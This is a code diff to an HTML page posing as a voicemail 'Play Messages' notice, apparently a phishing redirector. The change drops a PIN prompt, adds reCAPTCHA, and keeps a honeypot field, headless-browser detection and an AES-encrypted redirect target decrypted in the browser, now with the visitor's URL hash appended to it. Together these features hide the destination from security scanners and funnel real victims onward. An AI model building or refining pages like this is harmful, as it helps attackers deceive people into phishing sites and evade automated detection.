@@ -51,15 +51,6 @@
       color: #555;
     }
 
-    input.code-input {
-      margin-top: 1rem;
-      width: 100%;
-      padding: 0.5rem;
-      font-size: 1rem;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-    }
-
     button.play {
       background: #4CAF50;
       color: white;
@@ -79,49 +70,40 @@
       background: #45a049;
     }
 
-    #captcha-stub {
-      margin: 1rem 0;
-      font-size: 0.9rem;
+    .g-recaptcha {
+      margin-top: 1rem;
     }
   </style>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
   <div class="voicemail-container">
     <h1>Play Messages</h1>
     <form id="voicemail-form" onsubmit="return false;">
-      <input type="password" class="code-input" placeholder="Enter PIN" name="pin" required />
       <!-- Honeypot field -->
       <input type="text" name="extra_field" style="display: none;" autocomplete="off" />
-      
-      <!-- CAPTCHA stub -->
-      <div id="captcha-stub" style="display: none;">
-        <label><input type="checkbox" id="captcha-check" /> I'm not a robot</label>
-      </div>
+
+      <!-- CAPTCHA -->
+      <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
 
       <div class="message">
         <div class="message-info">
           <strong>Caller: John ****</strong>
           <span>May 29, 2025 - 10:15 AM</span>
         </div>
-        <button class="play">▶️ Play</button>
+        <button class="play" type="button">▶️ Play</button>
       </div>
     </form>
   </div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <script>
-    const correctPin = "8911";
-    const maxAttempts = 3;
-    let attempts = 0;
-
-    // AES-encrypted URL (https://google.com)
-    const encryptedRedirect = "U2FsdGVkX19v4zOFaCWT7dRHF2O1nV++DoTOoonLAssbpocFzPDmAJj5gl/w5MtF";
-    const aesKey = "2XPoyVKDRqzq7YFqRdkGxNHuIPyg4kwSbD2EY5TcA3N3LbBIHefVZKRgGj+yDLQm";
-
     const playButton = document.querySelector('.play');
     const form = document.getElementById('voicemail-form');
-    const captchaStub = document.getElementById('captcha-stub');
-    const captchaCheck = document.getElementById('captcha-check');
+
+    // AES-encrypted URL (e.g. https://google.com)
+    const encryptedRedirect = "U2FsdGVkX19v4zOFaCWT7dRHF2O1nV++DoTOoonLAssbpocFzPDmAJj5gl/w5MtF";
+    const aesKey = "2XPoyVKDRqzq7YFqRdkGxNHuIPyg4kwSbD2EY5TcA3N3LbBIHefVZKRgGj+yDLQm";
 
     function decryptAES(encrypted, key) {
       return CryptoJS.AES.decrypt(encrypted, key).toString(CryptoJS.enc.Utf8);
@@ -138,53 +120,33 @@
 
     playButton.addEventListener('click', () => {
       const formData = new FormData(form);
-      const enteredPin = formData.get("pin");
       const honeypot = formData.get("extra_field");
 
-      // Honeypot bot check
       if (honeypot) {
         alert("Bot activity detected.");
         return;
       }
 
-      // CAPTCHA check (if visible)
-      if (captchaStub.style.display !== 'none' && !captchaCheck.checked) {
-        alert("Please verify you are not a robot.");
+      const recaptchaResponse = grecaptcha.getResponse();
+      if (!recaptchaResponse) {
+        alert("Please complete the CAPTCHA.");
         return;
       }
 
-      // Headless detection
       if (isHeadlessBrowser()) {
         alert("Headless browsers are not allowed.");
         return;
       }
 
-      if (enteredPin === correctPin) {
-        try {
-          const redirectURL = decryptAES(encryptedRedirect, aesKey);
-          if (redirectURL) {
-            window.location.href = redirectURL;
-          } else {
-            alert("Decryption failed.");
-          }
-        } catch (err) {
-          alert("Invalid redirect or decryption error.");
-        }
-      } else {
-        attempts++;
-        if (attempts >= maxAttempts) {
-          alert("Too many incorrect attempts. Access locked.");
-          playButton.disabled = true;
-        } else {
-          alert(`Incorrect code. ${maxAttempts - attempts} attempt(s) left.`);
-        }
+      try {
+        const redirectURL = decryptAES(encryptedRedirect, aesKey);
+        const hash = window.location.hash || ""; // preserves original #hash from URL
+        const finalURL = redirectURL + hash;
+        window.location.href = finalURL;
+      } catch (err) {
+        alert("Redirect failed.");
       }
     });
-
-    // Optional CAPTCHA visibility delay
-    setTimeout(() => {
-      captchaStub.style.display = 'block';
-    }, 2000);
   </script>
 </body>
 </html>
